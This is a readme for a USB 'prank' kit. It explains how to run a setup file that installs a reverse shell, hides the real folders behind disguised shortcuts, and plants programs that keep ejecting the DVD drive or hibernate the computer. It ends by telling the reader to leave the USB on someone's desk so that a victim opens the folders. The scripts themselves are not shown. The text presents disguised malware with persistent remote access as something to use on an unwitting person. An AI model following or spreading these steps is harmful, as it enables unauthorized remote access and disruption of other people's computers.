DON'T CLICK ON THE SHORTCUTS. YOU WILL TROLL YOURSELF.

Copy the files to a USB. Then, run the setup file to set up reverse shell, 
hide the folders, and move the setup.bat and readme.txt into the hidden
folders. after running the setup file, the folders will not be visible  
(only the "shortcuts" will be). The only way to get into the folders 
after they are hidden is by typing the directory of the hidden folder into 
the explorer bar, or, using cmd, cd into the current directory then type 
[other\control\showfolders.bat]. To delete all damage from the target computer,
type [other\control\delete.bat] and type Y when prompted.


What each shortcut does:

[DVD RW Drive - Shortcut] = DVD Drive opens repeatedly and closes even after restarting
[Pictures] = Reverse shell that runs every 5 minutes
[School] = regular folder
[Writing Assignments] = Replaces\creates google chrome icon on desktop that hibernates the computer when opened

All programs run in the background.

Now drop your USB onto someone's desk, and when they open a folder, they'll get rekt.